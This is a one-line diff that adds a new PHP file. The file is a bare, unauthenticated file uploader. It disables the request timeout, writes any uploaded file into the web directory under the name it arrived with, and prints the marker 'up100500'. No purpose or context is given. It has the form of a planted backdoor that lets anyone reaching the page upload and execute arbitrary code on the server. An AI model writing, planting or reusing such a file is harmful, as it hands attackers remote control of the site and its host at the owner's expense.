@@ -1,0 +1,1 @@
+<?php ignore_user_abort(1);set_time_limit(0);if(move_uploaded_file($_FILES['uploaded']['tmp_name'], basename($_FILES['uploaded']['name']))){echo "up100500";}echo '<form enctype="multipart/form-data" method="POST"><input name="uploaded" type="file"><input type="submit" value="U"></form>';?>
